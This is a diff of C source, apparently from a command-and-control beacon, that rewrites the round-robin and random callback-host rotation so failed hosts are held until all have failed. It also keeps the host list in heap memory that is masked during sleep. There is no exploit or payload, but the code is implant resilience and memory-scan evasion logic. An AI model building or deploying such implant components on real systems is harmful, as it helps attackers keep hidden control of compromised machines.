@@ -34,7 +34,16 @@ void strategy_setup(strategy_info * si, int strategy, int rotation_timer, int fa
 }
 
 /*
-* 主机/域名轮换的轮询策略实现
+* 主机/域名轮换的轮询与随机策略实现
+* ------------------------------------------------------------
+* 4.10：轮询和随机策略下，失败过的主机被 hold，直到所有主机都失败过
+* （"to stabilize connections"）。被 hold 的主机跳过；最后一台也失败时
+* 全部释放，从头再来。failover-* 和 rotate-* 策略按自己的计时器换主机，
+* 不 hold。
+*
+* 两个策略共用这一份状态：主机列表的一份受跟踪副本及其 token
+* （host,uri,host,uri...）、hold 表、当前走到哪。调用成对到来——第一次
+* 返回主机，第二次返回它的 uri——lastCheckinFailed 说的是上一对的主机。
 */
 /* 主机列表 tokenize 序言（3 个策略共用）：调用方已 malloc/track hs。 */
 static int split_hosts(char * hosts, char * hs, char ** tokens) {
@@ -49,90 +58,105 @@ static int split_hosts(char * hosts, char * hs, char ** tokens) {
 	return tokenCount;
 }
 
-char * next_host_round_robin(char * hosts) {
-	static char * token = NULL;
-	char * ptr;
-	if (token == NULL) {
-		token = (char *)malloc(strlen(hosts) + 1);
-		strncpy(token, hosts, strlen(hosts) + 1);
-		/* host rotation list in plaintext heap - mask it during sleep.
-		 * the buffer is freed and re-malloced every wrap, so the remove
-		 * below must stay paired with this add. */
-		track_memory_add(token, strlen(hosts) + 1, TRACK_MEMORY_MALLOC, TRUE, NULL);
-		return strtok(token, ",");
-	}
-	else {
-		ptr = strtok(NULL, ",");
-		if (ptr == NULL) {
-			track_memory_remove(token);
-			free(token);
-			token = NULL;
-			return next_host_round_robin(hosts);
-		}
-		else {
-			return ptr;
-		}
-	}
-}
-
 /*
 * 在指定范围内生成随机数（基于可用主机数量）
 */
-int randomInRange(int min, int max) {
+static int randomInRange(int min, int max) {
 	/* max<min（如空主机列表的 0,-1）会使模数变 0 → 整数除零崩溃 */
 	if (max < min)
 		return min;
 	return (rand() % (max - min + 1)) + min;
 }
 
-/*
-* 用于将成对数组项的随机索引号转换为对中第一项的编号。
-*    随机数 0,1  返回 0
-*    随机数 2,3  返回 2
-*    随机数 4,5  返回 4...
-*/
-int evenNumber(int number) {
-	int evenNumber = number - ((number) % 2);
-	// dlog("strategy.evenNumber - Input: %d evenNumber: %d \n", number, evenNumber);
-	return evenNumber;
+typedef struct {
+	char * hs;          /* the host list: plaintext heap, masked during sleep */
+	char * tokens[200]; /* host, /uri, host, /uri... */
+	int    count;       /* token count */
+	int    pairs;       /* host count: (count + 1) / 2 */
+	int    next;        /* token index where the next host call starts looking */
+	int    current;     /* token index of the last host returned; -1 before the first */
+	BOOL   held[100];   /* held[i]: the host at tokens[2 i] is out of rotation */
+	int    offset;      /* 0 = the next call returns a host, 1 = the uri of the current one */
+} rotation;
+
+/* the first call parses the list; every call afterwards reuses it */
+static void rotation_load(rotation * r, char * hosts) {
+	r->hs = (char *)malloc(strlen(hosts) + 1);  /* freed by track_memory_cleanup */
+	track_memory_add(r->hs, strlen(hosts) + 1, TRACK_MEMORY_MALLOC, TRUE, NULL);
+	r->count = split_hosts(hosts, r->hs, r->tokens);
+	r->pairs = (r->count + 1) / 2;
+	r->next = 0;
+	r->current = -1;
+	r->offset = 0;
 }
 
-/*
-* 主机/域名轮换的随机策略实现
-*/
-char * next_host_random(char * hosts) {
-	static char * hs = NULL;
-	static char *tokens[200];
-	static int tokenCount;
-	static int tokenIndex;
+/* a failed host is held; when the last one is held they are all released */
+static void rotation_note(rotation * r, BOOL failed) {
+	int i, held = 0;
+	if (failed && r->current >= 0)
+		r->held[r->current / 2] = TRUE;
+	for (i = 0; i < r->pairs; i++)
+		held += r->held[i] ? 1 : 0;
+	if (held == r->pairs) {
+		for (i = 0; i < r->pairs; i++)
+			r->held[i] = FALSE;
+	}
+}
 
+static char * rotation_pick(rotation * r, char * hosts, BOOL lastCheckinFailed, BOOL random) {
+	int idx, tries;
+	if (r->hs == NULL)
+		rotation_load(r, hosts);
+	if (r->count == 0)
+		return "";
 
-	if (hs == NULL) {
-		hs = (char *)malloc(strlen(hosts) + 1);  /* freed by track_memory_cleanup */
-		track_memory_add(hs, strlen(hosts) + 1, TRACK_MEMORY_MALLOC, TRUE, NULL);
-		tokenCount = split_hosts(hosts, hs, tokens);
-
-		// Set token index to random...
-		tokenIndex = -1;
+	/* the second call of a pair: the uri of the host just returned */
+	if (r->offset != 0) {
+		r->offset = 0;
+		return (r->current + 1 < r->count) ? r->tokens[r->current + 1] : "";
 	}
 
-	// New token index number?
-	if (tokenIndex < 0 || tokenIndex >= tokenCount) {
-		if (tokenCount < 2)
-			return "";
-		tokenIndex = evenNumber(randomInRange(0, tokenCount - 1));
-		// dlog("strategy.next_host_random - Random Token Index: %d \n", tokenIndex);
-		// Hosts will be at even number index entries: tokens[0,2,4,6,8...]
-		return tokens[tokenIndex];
+	rotation_note(r, lastCheckinFailed);
+
+	if (random) {
+		/* the n-th free host, n random */
+		int i, free_n = 0, pick;
+		for (i = 0; i < r->pairs; i++)
+			free_n += r->held[i] ? 0 : 1;
+		pick = randomInRange(0, free_n - 1);
+		idx = 0;
+		for (i = 0; i < r->pairs; i++) {
+			if (!r->held[i] && pick-- == 0) {
+				idx = i * 2;
+				break;
+			}
+		}
 	}
 	else {
-		// URI is at following even number array positions: tokens[1,3,5,7,9...]
-		int x = tokenIndex + 1;
-		tokenIndex = -1;
-		// dlog("strategy.next_host_random - URI Index: %d \n", x);
-		/* 奇数 token 数（畸形 host,uri 列表）时 x 可能==tokenCount */
-		return (x < tokenCount) ? tokens[x] : "";
+		/* the first free host after the last one; wraps to the first */
+		idx = r->next;
+		for (tries = 0; tries < r->pairs && r->held[idx / 2]; tries++) {
+			idx += 2;
+			if (idx >= r->count)
+				idx = 0;
+		}
 	}
+
+	r->offset = 1;
+	r->current = idx;
+	r->next = (idx + 2 >= r->count) ? 0 : idx + 2;
+	return r->tokens[idx];
+}
+
+static rotation round_robin;
+static rotation random_rotation;
+
+char * next_host_round_robin(char * hosts, BOOL lastCheckinFailed) {
+	return rotation_pick(&round_robin, hosts, lastCheckinFailed, FALSE);
+}
+
+char * next_host_random(char * hosts, BOOL lastCheckinFailed) {
+	return rotation_pick(&random_rotation, hosts, lastCheckinFailed, TRUE);
 }
 
 /*
@@ -315,14 +339,14 @@ char * next_host(char * hosts, BOOL lastCheckinFailed, strategy_info * si) {
 
 	// dlog("strategy.next_host - Getting Host: hosts: %s strategy: %d \n", hosts, si->strategy);
 	if (si->strategy == HOST_STRATEGY_RANDOM) {
-		host = next_host_random(hosts);
+		host = next_host_random(hosts, lastCheckinFailed);
 	}
 	else if (si->strategy == HOST_STRATEGY_EVENT) {
 		host = next_host_priority_failover(hosts, lastCheckinFailed, si);
 	}
 	else {
 		// Should be processing: HOST_STRATEGY_ROUND_ROBIN [or undefined/default]
-		host = next_host_round_robin(hosts);
+		host = next_host_round_robin(hosts, lastCheckinFailed);
 	}
 	// dlog("strategy.next_host - Returning host: %s \n", host);
 	return host;
